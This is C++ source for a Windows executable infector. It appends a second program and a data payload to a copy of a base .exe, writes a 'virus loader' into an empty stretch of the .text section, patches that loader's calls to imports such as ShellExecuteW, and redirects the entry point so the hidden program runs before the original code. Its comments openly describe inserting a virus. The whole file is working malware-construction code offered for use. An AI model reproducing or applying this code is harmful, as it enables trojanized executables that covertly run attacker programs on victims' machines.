#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <stdio.h>
#include <iostream>
#include <string>
#include <vector>
#include <map>

typedef long long addr_t;

#define CODE_SECTION_NAME ".text"
#define IMPORT_DIRECTORY_SECTION ".rdata"
#define RELATIVE_JUMP_INSTRUCTION 0xE9
#define RELATIVE_CALL_INSTRUCTION 0xE8
#define SIZEOF_REL32_JUMP 5
#define SIZEOF_REL32_CALL 5
#define EMPTY_SECTION_MARGIN 0

// map filled with needed extern functions
std::map<std::string, std::map<std::string, addr_t>> dllToFuncNameToAddress = {
    {
        "KERNEL32.dll",
        {
            { "CreateFileW", 0 },
            { "SetFilePointerEx", 0 },
            { "ReadFile", 0 },
            { "WriteFile", 0 },
            { "CloseHandle", 0 },
            { "GetModuleFileNameW", 0 },
        }
    },
    {
        "SHELL32.dll",
        {
            { "ShellExecuteW", 0 }
        }
    },
    {
        "VARIABLES",
        {
            { "BaseFileSize", 0 }
        }
    }
};

std::vector<std::pair<std::string, std::string>> externFunctionsToFill = {
    { "KERNEL32.dll", "GetModuleFileNameW" },
    { "KERNEL32.dll", "CreateFileW" },
    { "VARIABLES", "BaseFileSize" },
    { "KERNEL32.dll", "SetFilePointerEx" },
    { "KERNEL32.dll", "CreateFileW" },
    { "KERNEL32.dll", "ReadFile" },
    { "KERNEL32.dll", "WriteFile" },
    { "KERNEL32.dll", "CloseHandle" },
    { "KERNEL32.dll", "CloseHandle" },
    { "SHELL32.dll", "ShellExecuteW" },
};

void analyzeEXE(const char* exePath);
std::string addPayload(const std::string& base, const std::string& payload, const std::string& additional);

int main()
{
    std::string basePath;
    std::cout << "Base exe path: ";
    std::getline(std::cin, basePath);

    std::string executablePath;
    std::cout << "File to execute path: ";
    std::getline(std::cin, executablePath);

    std::string payloadData;
    std::cout << "Payload data path: ";
    std::getline(std::cin, payloadData);

    std::string newPath = addPayload(basePath, executablePath, payloadData);
    analyzeEXE(newPath.c_str());
}

// function appends new executable and data to the end of the base executable
// input: paths of base exe, payload exe and payload data
// return: path of new executable
std::string addPayload(const std::string& base, const std::string& executable, const std::string& additional)
{
    std::string newPath = "COPY - " + base;
    CopyFileA(base.c_str(), newPath.c_str(), FALSE);

    // add payload to copy
    HANDLE houtfile = CreateFileA(newPath.c_str(), FILE_APPEND_DATA, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    HANDLE hinfile = CreateFileA(executable.c_str(), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    // get file size
    dllToFuncNameToAddress["VARIABLES"]["BaseFileSize"] = GetFileSize(houtfile, NULL);

    // write executable
    BYTE buff[1024];
    DWORD bytesRead = 0;
    while (ReadFile(hinfile, buff, sizeof(buff), &bytesRead, NULL) && bytesRead > 0)
        WriteFile(houtfile, buff, bytesRead, NULL, NULL);

    CloseHandle(hinfile);
    // write additional payload
    hinfile = CreateFileA(additional.c_str(), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    while (ReadFile(hinfile, buff, sizeof(buff), &bytesRead, NULL) && bytesRead > 0)
        WriteFile(houtfile, buff, bytesRead, NULL, NULL);

    CloseHandle(hinfile);
    CloseHandle(houtfile);

    return newPath;
}

addr_t base;
// function writes the virus loader inside the new executable
// input: exe file ptr, offset between code section file position to virtual address
// return: none
void writeVirusLoader(FILE* exeFile, addr_t codeSectionRawToVirtual)
{
    std::string virusLoaderPath;
    std::cout << "Enter virus loader binary path: ";
    std::getline(std::cin, virusLoaderPath);

    FILE* virusLoader = fopen(virusLoaderPath.c_str(), "r");
    if (!virusLoader)
    {
        printf("Can't open virus loader file\n");
        return;
    }

    int c = fgetc(virusLoader);
    int callCounter = 0, callIndex = 0;    // 5 times 0xE8 in a row indicates an extern call (without a valid address)
    while (c != EOF)
    {
        if (c == 0x33)
            callCounter++;
        else
            callCounter = 0;
        if (callCounter == 4)
        {
            fseek(exeFile, -3, SEEK_CUR);
            auto func = externFunctionsToFill[callIndex++];
            if (!dllToFuncNameToAddress[func.first][func.second])
                printf("Oh no couldn't find function (%s -> %s)\n", func.first.c_str(), func.second.c_str());
            if (func.first == "VARIABLES")
            {
                fwrite(&dllToFuncNameToAddress[func.first][func.second], sizeof(int), 1, exeFile);
                c = fgetc(virusLoader);
                continue;
            }
            addr_t virtualDestination = dllToFuncNameToAddress[func.first][func.second];
            addr_t virtualSource = (addr_t)ftell(exeFile) + codeSectionRawToVirtual + sizeof(DWORD);  // end of current instruction
            int relativeCall = virtualDestination - virtualSource;
            fwrite(&relativeCall, sizeof(int), 1, exeFile);
            c = fgetc(virusLoader);
            continue;
        }
        // write next byte
        fputc(c, exeFile);
        c = fgetc(virusLoader);
    }

    fclose(virusLoader);
}

// function reads string from file into a buffer
// input: file ptr to read from, file position and buffer to store buffer
// return: none
void freadstr(FILE* file, char* buffer, long pos)
{
    long startPos = ftell(file);

    fseek(file, pos, SEEK_SET);
    int c = fgetc(file);
    while (!feof(file) && c != 0)
    {
        *buffer++ = c;
        c = fgetc(file);
    }
    *buffer++ = 0;

    fseek(file, startPos, SEEK_SET);
}

// function fills addresses for requires extern call using the import directory
// input: exe file ptr, position of import directory in file, offset between virtual address to file raw position in code section, image base address
// return: none
void getExternCallAddresses(FILE* file, int importDirectoryPos, addr_t virtualRawOffset, addr_t imageBase)
{
    char nameBuffer[1000] = { 0 };

    fseek(file, importDirectoryPos + virtualRawOffset, SEEK_SET);
    IMAGE_IMPORT_DESCRIPTOR importDescriptor;

    // go over all DLLs
    while (true)
    {
        fread(&importDescriptor, sizeof(IMAGE_IMPORT_DESCRIPTOR), 1, file);
        if (!importDescriptor.Characteristics)
            break;

        // get name and check if there are needed extern functions in it
        freadstr(file, nameBuffer, importDescriptor.Name + virtualRawOffset);
        if (dllToFuncNameToAddress.find(nameBuffer) == dllToFuncNameToAddress.end())
            continue;
        auto& funcToAddress = dllToFuncNameToAddress[nameBuffer];

        long filePos = ftell(file);
        // go over all functions
        IMAGE_THUNK_DATA64 ILT;
        fseek(file, importDescriptor.FirstThunk + virtualRawOffset, SEEK_SET);
        long offset = 0;
        while (true)
        {
            fread(&ILT, sizeof(IMAGE_THUNK_DATA64), 1, file);
            if ((ILT.u1.Ordinal & IMAGE_ORDINAL_FLAG) || !ILT.u1.AddressOfData)
                break;

            freadstr(file, nameBuffer, ILT.u1.AddressOfData + offsetof(IMAGE_IMPORT_BY_NAME, Name) + virtualRawOffset);
            if (funcToAddress.find(nameBuffer) != funcToAddress.end())
                funcToAddress[nameBuffer] = importDescriptor.FirstThunk + imageBase + offset;;

            offset += sizeof(IMAGE_THUNK_DATA64);
        }
        // restore position
        fseek(file, filePos, SEEK_SET);
    }
}

// function analyzes exe file and inserts the virus in it.
// input: path of exe file
// return: none
void analyzeEXE(const char* exePath)
{
    IMAGE_DOS_HEADER dosHeader;
    IMAGE_FILE_HEADER fileHeader;
    IMAGE_OPTIONAL_HEADER64 optHeader;
    IMAGE_SECTION_HEADER codeSectionHeader = { 0 }, currentSectionHeader;
    addr_t importDirVirtualToRaw = 0, codeSectionRawToVirtual = 0;

    FILE* file = fopen(exePath, "r+b");
    if (!file)
    {
        printf("Can't open file :(\n");
        return;
    }
    // extract pe format tables
    fread(&dosHeader, sizeof(IMAGE_DOS_HEADER), 1, file);

    if (dosHeader.e_magic != IMAGE_DOS_SIGNATURE)
    {
        printf("Invalid magic :(\n");
        return;
    }

    // jump and read file header, optional header
    fseek(file, dosHeader.e_lfanew + sizeof(DWORD), SEEK_SET);
    fread(&fileHeader, sizeof(IMAGE_FILE_HEADER), 1, file);
    fread(&optHeader, sizeof(IMAGE_OPTIONAL_HEADER64), 1, file);

    // TEMP
    base = optHeader.ImageBase;

    fseek(file, fileHeader.SizeOfOptionalHeader - sizeof(IMAGE_OPTIONAL_HEADER64), SEEK_CUR);
    // read section headers
    int sectionCount = 0;
    for (int i = 0; i < fileHeader.NumberOfSections; i++)
    {
        fread(&currentSectionHeader, sizeof(IMAGE_SECTION_HEADER), 1, file);

        if (!strcmp((char*)currentSectionHeader.Name, CODE_SECTION_NAME))
        {
            codeSectionHeader = currentSectionHeader;
            codeSectionRawToVirtual = currentSectionHeader.VirtualAddress + optHeader.ImageBase - currentSectionHeader.PointerToRawData;
        }
        else if (!strcmp((char*)currentSectionHeader.Name, IMPORT_DIRECTORY_SECTION))
            importDirVirtualToRaw = currentSectionHeader.PointerToRawData - currentSectionHeader.VirtualAddress;
    }

    getExternCallAddresses(file, optHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress, importDirVirtualToRaw, optHeader.ImageBase);

    // read code section and find unused sections
    int size = 0;
    int maxSize = -1;
    int overwriteRaw = 0;
    fseek(file, codeSectionHeader.PointerToRawData, SEEK_SET);
    for (int i = 0; i < codeSectionHeader.SizeOfRawData; i++)
    {
        unsigned char b;
        fread(&b, sizeof(unsigned char), 1, file);
        if (b == 0x00)
            size++;
        else
        {
            if (size > maxSize)
            {
                maxSize = size;
                overwriteRaw = codeSectionHeader.PointerToRawData + i - size + EMPTY_SECTION_MARGIN;
            }
            size = 0;
        }
    }
    maxSize -= EMPTY_SECTION_MARGIN + SIZEOF_REL32_JUMP;
    printf("size: %d\n", maxSize);
    addr_t overwriteVirtual = codeSectionHeader.VirtualAddress - codeSectionHeader.PointerToRawData + overwriteRaw;

    // inject virus loading code
    fseek(file, overwriteRaw, SEEK_SET);

    writeVirusLoader(file, codeSectionRawToVirtual);

    // write jump to original entry point
    fputc(RELATIVE_JUMP_INSTRUCTION, file);
    // jump = destination - source - instruction size
    long virtualSource = overwriteVirtual + ftell(file) - overwriteRaw;
    long jump = optHeader.AddressOfEntryPoint - virtualSource - SIZEOF_REL32_JUMP + 1;
    fwrite(&jump, sizeof(long), 1, file);

    // change entry point
    optHeader.AddressOfEntryPoint = overwriteVirtual;
    // rewrite updated opt header
    fseek(file, dosHeader.e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER), SEEK_SET);
    fwrite(&optHeader, sizeof(IMAGE_OPTIONAL_HEADER64), 1, file);

    fclose(file);
}